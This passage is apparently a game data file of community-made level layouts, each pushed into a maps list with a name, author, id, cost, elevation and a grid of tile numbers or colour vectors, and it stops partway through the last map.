maps.push({name="Jump Shrine",author="sivi",id="#1694697546",direction="forward",cost=288,elevation=0,map=[0,0,1,1,1,1,1,1,112,2,2,1,1,1,1,1,1,0,0,0,0,1,1,90,12,75,12,12,12,12,9998,12,12,75,12,90,1,1,0,0,1,1,94,12,0,77,0,0,32,32,32,0,0,77,0,12,94,1,1,0,1,90,12,0,0,0,0,0,33,33,33,0,0,0,0,0,12,90,1,0,1,12,0,0,0,0,0,0,34,34,34,0,0,0,0,0,0,12,1,0,1,75,77,187,20,93,0,0,34,34,34,0,0,93,20,186,77,75,1,0,1,12,0,0,0,0,0,0,20,54,20,0,0,0,0,0,0,12,1,0,1,12,0,0,0,0,0,90,54,54,54,90,0,0,0,0,0,12,1,0,1,12,32,33,34,34,20,54,0,34,186,54,20,34,34,33,32,12,1,0,1,12,32,33,34,34,54,54,0,148,0,54,54,34,34,33,32,12,1,0,1,12,32,33,34,34,20,54,0,37,186,54,20,34,34,33,32,12,1,0,1,12,0,0,0,0,0,90,54,54,54,90,0,0,0,0,0,12,1,0,1,12,0,0,0,0,0,0,20,54,20,0,0,0,0,0,0,12,1,0,1,75,77,187,20,93,0,0,34,34,34,0,0,93,20,186,77,75,1,0,1,12,0,0,0,0,0,0,34,34,34,0,0,0,0,0,0,12,1,0,1,90,12,0,0,0,0,0,33,33,33,0,0,0,0,0,12,90,1,0,1,1,94,12,0,77,0,0,32,32,32,0,0,77,0,12,94,1,1,0,0,1,1,90,12,75,12,12,12,12,12,12,12,75,12,90,1,1,0,0,153,9,1,1,1,1,1,1,112,112,112,1,1,1,1,1,1,0,0,0,0,154,0,0,0,0,0,1,112,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="its over",author="alli",id="#1694705102",direction="left",cost=242,elevation=0,map=[0,1,1,1,0,0,0,0,0,0,0,0,0,1,2,2,108,1,1,0,1,93,93,93,1,0,0,0,0,0,0,0,0,1,9998,9998,8,3,14,1,1,12,12,12,1,1,1,1,1,1,1,1,1,1,8,48,8,8,48,1,1,8,8,8,0,170,95,8,170,95,8,170,95,8,170,34,0,170,34,1,1,89,8,8,0,181,95,8,182,95,8,190,95,8,191,34,0,173,34,1,1,90,8,8,0,8,95,8,0,95,8,0,95,8,0,34,0,8,34,1,2,9998,8,8,0,170,0,1,1,1,1,1,1,1,1,1,105,9998,105,1,2,8,8,8,0,180,0,1,0,0,0,0,0,0,0,1,0,174,170,1,108,8,8,8,0,8,0,1,1,1,1,1,1,1,1,1,0,8,0,1,1,90,8,8,0,8,0,10,8,105,0,8,10,0,8,105,0,8,0,1,1,94,8,8,0,179,0,10,178,9998,0,177,10,0,176,9998,0,175,170,1,1,90,8,8,0,170,0,10,170,105,0,170,10,0,170,105,0,0,0,1,0,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Carousel",author="sivi",id="#1694717528",direction="forward",cost=195,elevation=0,map=[0,0,0,1,1,1,1,1,114,2,2,1,1,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,0,0,0,0,180,0,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,130,0,170,0,130,0,0,0,0,0,1,1,0,1,0,0,170,173,0,0,0,0,0,0,0,0,0,179,170,0,0,1,0,1,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,199,1,119,1,199,0,0,0,0,0,0,1,0,1,0,0,130,0,0,199,119,119,119,119,119,199,0,0,130,0,0,1,0,1,0,0,0,0,0,1,119,93,119,93,119,1,0,0,0,0,0,1,153,1,0,174,170,0,77,119,119,119,119,119,119,119,77,0,170,178,0,1,14,1,0,0,0,0,0,1,119,93,119,93,119,1,0,0,0,0,0,1,154,1,0,0,130,0,0,199,119,119,119,119,119,199,0,0,130,0,0,1,0,1,0,0,0,0,0,0,199,1,119,1,199,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,77,0,0,0,0,0,0,0,0,1,0,1,0,0,170,175,0,0,0,0,0,0,0,0,0,177,170,0,0,1,0,1,1,0,0,0,0,0,130,0,170,0,130,0,0,0,0,0,1,1,0,0,1,1,0,0,0,0,0,0,176,0,0,0,0,0,0,1,1,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,1,1,1,1,114,114,114,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,1,114,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="Need More Boulettes",author="Spy Monkeh",id="#1695005200",direction="forward",cost=106,elevation=0,map=[0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,60,60,60,60,60,60,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,40,40,40,40,40,40,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,20,20,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="The Obsolete Guy",author="NyaaaDoge",id="#1695098970",direction="forward",cost=335,elevation=0,map=[146,146,146,146,146,146,37,37,37,2,2,37,37,37,37,146,146,146,146,146,146,146,146,146,146,37,37,37,37,37,37,37,37,37,37,37,146,146,146,146,146,146,146,146,37,37,37,37,37,37,37,37,37,37,37,37,37,146,146,146,146,146,146,37,37,37,37,37,37,37,37,37,Vector(141,134,62),Vector(149,145,61),Vector(120,116,56),Vector(65,63,38),Vector(52,51,32),Vector(53,53,33),146,146,146,146,37,37,37,37,37,37,37,37,37,Vector(214,200,85),Vector(69,67,45),Vector(50,50,29),Vector(61,60,39),Vector(65,65,42),Vector(40,39,23),Vector(51,50,34),Vector(51,49,36),146,146,37,37,Vector(243,222,77),37,Vector(223,203,70),37,37,37,37,Vector(183,171,69),Vector(61,59,36),Vector(64,63,41),Vector(68,72,50),Vector(76,78,53),1,1,1,Vector(45,41,25),1,37,37,Vector(200,177,66),1,1,1,Vector(215,187,71),Vector(182,162,63),Vector(229,210,74),37,Vector(70,66,44),Vector(55,54,32),Vector(52,51,30),Vector(97,85,59),Vector(88,82,54),Vector(79,63,36),Vector(62,47,27),Vector(56,38,19),1,1,37,1,Vector(48,34,31),Vector(68,46,39),Vector(64,43,35),Vector(74,44,36),58,1,Vector(78,68,38),Vector(107,104,57),Vector(64,67,45),Vector(63,69,47),Vector(59,64,42),Vector(94,84,59),59,60,60,60,91,1,1,1,Vector(107,71,53),Vector(159,102,70),Vector(168,112,77),60,59,Vector(165,106,79),Vector(140,97,73),Vector(180,127,87),Vector(123,120,95),Vector(64,70,48),Vector(64,69,46),Vector(51,51,34),Vector(58,65,46),61,60,60,Vector(115,72,39),Vector(47,43,24),1,Vector(52,38,34),59,61,61,60,59,Vector(209,136,94),Vector(191,131,93),Vector(193,137,107),Vector(222,184,153),Vector(164,165,146),Vector(78,81,58),Vector(54,57,38),Vector(53,57,37),62,61,60,Vector(78,65,40),Vector(47,43,24),1,1,Vector(67,46,36),Vector(104,64,48),58,60,60,Vector(211,159,126),Vector(209,131,103),Vector(205,148,113),Vector(119,77,61),Vector(196,177,157),24,22,20,18,Vector(96,96,68),Vector(35,31,17),1,1,Vector(221,199,72),1,Vector(33,25,25),Vector(62,44,40),Vector(74,48,39),Vector(171,102,74),Vector(95,55,43),Vector(99,61,48),Vector(141,83,62),Vector(123,84,61),Vector(65,43,36),Vector(211,203,187),93,24,24,24,Vector(161,166,145),Vector(80,74,48),Vector(26,22,10),1,37,Vector(181,163,62),1,Vector(36,27,27),1,Vector(95,60,45),Vector(127,89,54),Vector(153,126,60),Vector(197,180,67),Vector(147,141,67),Vector(196,193,170),Vector(222,223,204),Vector(219,219,200),Vector(218,217,198),Vector(220,220,201),Vector(220,219,199),Vector(218,218,199),Vector(204,199,176),Vector(150,145,122),Vector(80,76,57),37,37,37,Vector(163,151,57),Vector(99,92,37),Vector(195,178,64),37,37,37,37,Vector(92,92,62),Vector(131,125,92),Vector(83,83,60),Vector(96,101,74),Vector(103,108,78),Vector(175,162,130),Vector(175,164,133),Vector(177,170,140),Vector(197,190,163),Vector(197,195,172),37,37,37,37,37,37,37,37,37,37,Vector(103,111,82),Vector(98,105,77),1,Vector(60,68,48),Vector(64,72,50),Vector(78,86,57),Vector(79,86,58),Vector(86,94,67),Vector(101,106,76),Vector(118,116,83),146,37,37,37,37,37,37,37,37,37,Vector(182,173,83),Vector(105,105,73),Vector(87,94,65),Vector(94,105,75),Vector(98,107,75),Vector(96,107,76),Vector(95,107,76),Vector(95,106,77),Vector(92,107,75),146,146,146,37,37,37,37,37,37,37,37,37,Vector(233,214,80),Vector(163,158,74),Vector(95,103,67),Vector(79,88,59),Vector(82,91,64),Vector(82,90,63),Vector(74,84,59),146,146,146,146,146,37,37,37,37,37,37,37,37,37,37,Vector(244,223,77),Vector(180,171,72),Vector(79,87,59),Vector(73,79,51),146,146,146,146,146,146,146,37,37,37,37,37,37,37,37,37,37,37,37,146,146,146,146,146,146,146,146,146,37,37,37,37,2,2,37,37,37,37,146,146,146,146,146]});
maps.push({name="Movement Master",author="NyaaaDoge",id="#1695099163",direction="forward",cost=233,elevation=12,map=[0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,5,0,0,0,1,1,1,1,1,0,0,0,0,0,0,0,0,1,13,185,185,13,1,1,121,121,121,121,121,1,0,0,0,0,0,0,0,0,0,5,5,0,0,1,137,61,127,61,137,1,0,0,20,20,20,0,0,0,0,127,127,0,0,1,55,55,55,55,55,1,0,0,20,134,20,0,0,0,0,0,0,0,0,1,54,14,132,14,54,1,0,0,20,20,20,0,0,1,35,36,36,35,1,1,54,14,14,14,54,1,0,0,90,37,90,0,0,0,0,0,0,0,0,1,14,14,14,14,14,1,0,0,37,37,37,0,0,1,36,37,37,36,1,0,14,18,18,18,14,0,0,0,17,136,17,0,0,0,0,189,189,0,141,67,65,18,126,18,66,67,0,0,37,37,37,0,0,0,0,106,106,0,0,67,65,19,19,19,66,67,0,0,90,37,90,0,0,0,1,131,131,1,0,0,14,19,133,19,14,0,0,0,23,23,23,0,0,0,0,1,1,0,0,0,14,19,19,19,14,0,0,0,90,65,90,0,0,0,0,0,0,0,0,0,14,14,90,14,14,0,0,0,23,23,23,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,93,93,93,0,0,0,0,0,0,0,0,0,15,15,15,15,15,0,0,0,93,94,93,0,0,0,0,0,0,0,0,0,116,116,116,116,116,0,0,0,93,93,93,0,0,0,0,0,0,0,0,0,116,116,116,116,116,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,117,117,117,117,117,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,2,2,117,90,0,0,0,0,0,0,0,0]});
maps.push({name="Dual Level Floors",author="NyaaaDoge",id="#1695287662",direction="forward",cost=153,elevation=-3,map=[0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,112,112,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,13,11,11,13,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,11,11,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,185,185,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,185,185,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,185,90,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,185,185,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,185,185,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,184,184,14,0,0,0,0,0,0,0,0,0,0,0,0,0,1,24,67,15,90,185,15,67,24,1,0,0,0,0,0,0,0,0,0,0,1,24,67,15,185,185,15,67,24,1,0,0,0,0,0,0,0,0,0,0,0,1,14,14,185,185,14,90,1,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,185,185,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,185,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,113,11,11,113,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,109,109,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,109,95,95,109,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,91,91,91,91,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,90,2,2,89,1,0,0,0,0,0,0,0]});
maps.push({name="Mind Your Head",author="NyaaaDoge",id="#1695287762",direction="left",cost=188,elevation=-6,map=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,115,115,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,14,14,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,14,14,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,184,184,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,87,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,184,184,184,90,0,1,1,1,1,1,1,1,1,1,17,0,0,0,0,17,184,184,184,17,0,90,109,110,111,112,112,184,184,184,184,17,90,17,17,17,184,184,17,0,0,2,109,110,111,112,90,184,184,184,184,184,184,184,184,184,184,184,17,0,0,2,109,110,111,112,112,184,184,184,184,184,184,184,184,184,184,184,17,0,0,1,1,1,1,1,1,1,1,1,1,17,17,90,17,17,148,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,145,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="3D Platformer",author="NyaaaDoge",id="#1695288105",direction="left",cost=121,elevation=-13,map=[0,0,0,0,0,0,0,1,1,2,2,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,123,123,123,123,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,22,22,22,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,131,131,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,90,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,51,95,0,0,0,67,0,0,0,0,0,0,77,0,0,0,0,1,1,1,2,95,51,4,46,65,114,95,14,125,6,140,75,6,47,90,47,90,132,1,2,51,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,143,1,1,51,51,0,0,0,0,0,0,0,0,154,5,153,0,199,93,93,113,1,0,90,0,0,0,0,0,0,0,0,0,0,145,0,0,1,1,1,1,1,0]});
maps.push({name="So long csgo",author="Luffaren",id="#1695867163",direction="forward",cost=257,elevation=0,map=[1,0,0,1,1,1,0,0,0,0,0,Vector(232,181,143),2,2,Vector(81,44,18),Vector(79,54,29),0,0,0,0,1,0,1,1,0,1,0,0,0,0,Vector(235,201,174),Vector(255,197,151),Vector(162,121,82),Vector(80,36,9),Vector(90,53,25),0,0,0,0,0,0,1,1,0,0,1,0,0,0,0,Vector(255,201,159),Vector(214,159,120),Vector(105,64,30),Vector(108,74,48),0,0,0,0,0,Vector(67,71,23),0,0,0,0,0,0,0,0,0,Vector(230,205,181),Vector(253,195,153),Vector(150,107,63),Vector(109,76,46),0,0,0,0,0,0,Vector(53,53,10),0,0,0,0,0,0,Vector(65,68,61),Vector(1,0,2),Vector(122,105,93),Vector(255,200,158),Vector(206,157,113),Vector(105,65,21),0,0,0,0,0,0,0,Vector(40,39,11),0,0,0,0,0,Vector(34,41,25),Vector(1,0,2),Vector(1,0,2),Vector(218,169,135),Vector(255,211,169),Vector(147,103,60),Vector(110,80,60),0,0,0,0,0,0,Vector(87,86,70),Vector(41,41,12),0,0,0,0,Vector(43,50,31),Vector(8,20,0),Vector(1,0,2),Vector(153,117,87),Vector(247,189,143),Vector(206,172,142),Vector(34,13,5),Vector(57,29,12),Vector(68,37,14),Vector(44,25,14),Vector(1,0,2),Vector(1,0,2),Vector(49,50,50),93,Vector(34,32,12),Vector(57,51,28),0,0,0,Vector(51,60,38),Vector(17,30,0),Vector(17,30,7),Vector(108,96,74),Vector(250,187,145),Vector(235,183,143),Vector(11,0,0),Vector(99,79,64),Vector(116,89,71),Vector(114,90,73),Vector(74,49,33),Vector(79,53,40),Vector(29,16,11),Vector(17,13,11),Vector(61,53,30),Vector(62,61,28),Vector(29,27,7),0,0,Vector(17,30,0),Vector(28,47,0),Vector(31,47,8),Vector(19,32,4),Vector(79,67,50),Vector(134,101,77),Vector(67,47,37),Vector(38,29,27),Vector(58,44,36),Vector(1,0,2),Vector(1,0,2),Vector(94,60,40),Vector(111,75,50),Vector(91,65,47),Vector(49,29,19),Vector(46,28,15),Vector(118,107,62),Vector(144,136,76),0,0,Vector(41,64,0),Vector(36,55,10),Vector(29,46,8),Vector(22,29,6),Vector(13,12,4),Vector(1,0,2),Vector(1,0,2),Vector(109,85,68),Vector(92,69,49),Vector(1,0,2),Vector(1,0,2),Vector(126,93,72),Vector(101,70,43),Vector(62,37,21),Vector(73,45,31),Vector(51,30,22),Vector(24,8,0),Vector(122,111,62),0,Vector(33,62,0),Vector(44,68,6),Vector(31,47,8),Vector(25,32,7),Vector(17,22,7),Vector(11,16,7),Vector(6,12,13),Vector(1,0,2),Vector(187,141,110),Vector(160,126,93),Vector(1,0,2),Vector(76,57,44),Vector(116,80,54),Vector(88,58,38),Vector(59,30,12),Vector(118,79,58),Vector(127,92,69),Vector(54,32,22),Vector(54,36,19),0,Vector(47,80,0),Vector(40,62,4),Vector(29,41,6),Vector(22,25,11),Vector(13,21,8),Vector(13,16,7),Vector(1,0,2),Vector(41,29,21),Vector(249,198,159),Vector(130,90,60),Vector(187,154,129),Vector(225,193,167),Vector(229,195,167),Vector(100,63,37),Vector(94,57,36),Vector(148,104,78),Vector(129,83,59),Vector(60,31,14),Vector(52,35,22),0,Vector(51,86,2),Vector(39,59,5),Vector(27,37,3),Vector(12,17,7),Vector(15,22,12),Vector(14,20,7),Vector(1,0,2),Vector(146,117,98),Vector(172,126,81),Vector(156,119,83),Vector(173,126,100),Vector(255,220,188),Vector(251,206,174),Vector(150,104,75),Vector(115,71,47),Vector(166,116,87),Vector(191,135,99),Vector(92,55,35),Vector(65,39,24),0,Vector(57,85,9),Vector(69,77,18),Vector(127,108,40),Vector(93,71,26),Vector(31,25,11),Vector(7,18,3),Vector(31,26,17),Vector(211,158,119),Vector(255,205,169),Vector(124,91,65),Vector(93,58,33),Vector(248,189,152),Vector(227,168,127),Vector(193,137,99),Vector(116,69,37),Vector(196,144,109),Vector(194,143,113),Vector(77,44,23),Vector(91,64,38),0,0,Vector(71,85,17),Vector(165,146,60),Vector(147,113,42),Vector(109,106,67),Vector(1,0,2),Vector(151,111,84),Vector(255,223,190),Vector(255,222,189),Vector(91,52,26),Vector(151,117,91),Vector(241,181,143),Vector(216,156,113),Vector(218,157,116),Vector(179,125,84),Vector(135,89,61),Vector(70,31,13),Vector(81,47,24),Vector(161,142,77),0,0,Vector(59,81,16),Vector(61,65,16),Vector(69,63,17),Vector(32,36,8),Vector(30,29,9),Vector(143,98,71),Vector(238,197,170),Vector(255,229,202),Vector(196,148,111),Vector(255,213,182),Vector(241,185,149),Vector(209,153,113),Vector(193,135,97),Vector(142,100,69),Vector(106,68,44),Vector(137,103,62),Vector(188,168,100),Vector(200,188,110),0,0,Vector(37,59,0),Vector(14,31,0),Vector(6,21,0),Vector(1,0,2),Vector(41,30,12),Vector(46,25,11),Vector(52,26,7),Vector(102,56,29),Vector(154,106,77),Vector(152,108,75),Vector(166,115,80),Vector(99,60,39),Vector(37,22,13),Vector(1,0,2),Vector(24,17,12),Vector(42,36,20),Vector(71,71,38),Vector(54,54,26),0,0,0,0,0,0,0,0,0,0,Vector(156,105,73),Vector(165,128,98),0,0,Vector(1,0,2),Vector(42,40,40),94,0,Vector(82,78,62),Vector(59,56,17),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,Vector(68,71,21),Vector(68,71,21),0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="BirthdayCake I Guess",author="TheShy",id="#1696510756",direction="forward",cost=304,elevation=0,map=[0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,2,2,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,93,93,93,93,93,93,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,93,93,93,93,93,93,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,93,93,93,93,93,93,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,93,93,93,93,93,93,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,24,24,0,0,0,0,0,0,16,16,37,18,18,39,20,20,41,22,22,43,2,2]});
maps.push({name="ZhuMi",author="Sisy",id="#1699385645",direction="forward",cost=376,elevation=7,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,199,5,5,5,5,5,5,5,5,5,5,5,5,5,5,199,0,0,0,0,199,5,5,5,5,5,5,5,5,5,5,5,5,5,5,199,0,0,0,0,199,5,5,5,199,5,5,5,5,5,5,199,5,5,5,199,0,0,0,0,199,95,95,95,199,95,95,95,95,95,95,199,95,95,95,199,0,0,0,0,199,5,5,5,199,5,5,5,5,5,5,199,5,5,5,199,0,0,0,0,199,5,5,5,199,5,5,5,5,5,5,199,5,5,5,199,0,0,0,0,199,6,6,89,199,6,6,6,6,89,6,199,6,89,6,199,0,0,0,0,199,89,7,7,199,7,7,7,7,7,7,199,7,7,7,199,0,0,199,199,199,7,7,7,199,7,89,7,7,7,7,199,7,7,7,199,199,199,199,93,93,96,7,7,199,7,7,7,7,7,7,199,7,7,98,93,93,199,199,96,96,7,7,7,199,7,7,7,7,89,7,199,7,7,7,98,98,199,199,7,7,7,7,7,94,7,7,7,7,7,7,94,7,7,7,7,7,199,199,7,7,7,7,7,94,7,7,7,7,7,7,94,7,7,7,7,7,199,199,7,7,0,0,0,0,0,8,8,0,0,0,0,0,0,0,7,7,199,199,7,7,0,0,0,0,0,9,9,0,0,0,0,0,0,0,7,7,199,199,7,7,0,0,0,0,0,10,10,0,0,0,0,0,0,0,7,7,199,199,7,7,0,0,0,0,0,11,11,0,0,0,0,0,0,0,7,7,199,199,7,7,0,0,0,0,0,12,12,0,0,0,0,0,0,0,7,7,199,199,97,7,0,0,0,0,0,2,2,0,0,0,0,0,0,0,7,99,199]});
maps.push({name="Blame XyFe",author="TheShy",id="#1699728935",direction="forward",cost=388,elevation=19,map=[2,2,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,127,127,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,25,130,130,127,127,0,0,0,0,0,0,0,0,0,0,0,199,65,25,65,199,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,199,25,65,25,199,130,130,0,0,0,0,0,0,0,0,0,0,0,0,0,199,65,25,65,199,130,130,0,0,0,199,0,126,126,0,199,0,44,44,0,199,65,25,25,199,130,130,0,0,0,199,0,41,41,0,199,0,44,44,0,199,25,65,65,199,130,130,0,0,0,199,0,188,188,0,199,0,93,93,0,199,65,25,25,199,130,130,127,127,0,199,0,0,0,0,199,0,93,93,0,199,65,65,65,199,130,130,29,29,0,199,0,0,0,0,199,0,93,93,0,199,65,65,25,199,130,130,188,188,0,199,0,0,0,0,199,0,93,93,0,199,65,65,25,199,130,130,0,0,0,199,0,126,126,0,199,0,93,93,0,199,65,65,65,199,130,130,0,0,0,199,0,37,37,0,199,0,44,44,0,199,65,65,65,199,130,130,0,0,0,199,0,188,188,0,199,0,44,44,0,199,65,65,65,199,130,130,127,127,0,199,0,0,0,0,199,0,44,44,0,199,126,126,126,199,130,130,33,33,0,199,0,0,0,0,199,0,44,44,0,199,44,44,44,199,130,130,188,188,0,199,0,0,0,0,199,0,44,44,0,199,44,100,44,199,130,130,0,0,0,199,0,126,126,0,199,0,127,127,0,199,44,44,44,199,130,130,0,0,0,0,0,33,33,0,0,0,0,0,0,0,0,0,0,199,44,44,0,0,0,0,0,188,188,0,0,0,0,0,0,0,0,0,0,0,2,2]});
maps.push({name="fys gao wan xzz",author="TheShy",id="#1701102876",direction="forward",cost=192,elevation=0,map=[183,199,0,183,0,0,0,183,0,0,199,183,0,0,0,183,0,183,2,2,183,199,0,183,0,0,183,183,0,0,199,183,0,0,0,183,0,183,183,183,183,199,0,183,0,183,0,183,0,0,199,183,0,0,0,0,0,0,183,183,183,199,0,183,183,0,0,183,0,0,199,183,0,0,183,0,0,0,183,183,183,0,199,183,0,0,0,183,0,199,0,183,0,183,0,0,0,0,183,183,0,183,0,199,0,0,0,0,199,0,183,0,0,0,183,0,0,0,183,183,0,0,183,0,199,0,0,199,0,183,0,0,0,0,0,0,0,0,183,183,0,0,0,183,0,199,199,0,183,0,0,0,0,0,183,0,0,0,183,183,0,0,0,0,183,0,0,183,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,0,183,183,0,0,0,0,0,0,0,183,183,183,0,183,183,0,0,0,0,0,183,183,0,0,0,0,0,0,0,183,183,183,0,183,183,0,0,0,0,183,0,0,183,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,183,0,199,199,0,183,0,0,0,0,0,183,0,0,0,183,183,0,0,183,0,199,0,0,199,0,183,0,0,0,0,0,0,0,0,183,183,0,183,0,199,0,0,0,0,199,0,183,0,0,0,183,0,0,0,183,183,183,0,199,183,0,0,0,183,0,199,0,183,0,183,0,0,0,0,183,183,183,199,0,183,0,0,183,183,0,0,199,183,0,0,183,0,0,0,183,183,183,199,0,183,0,183,0,183,0,0,199,183,0,0,0,0,0,0,183,183,183,199,0,183,183,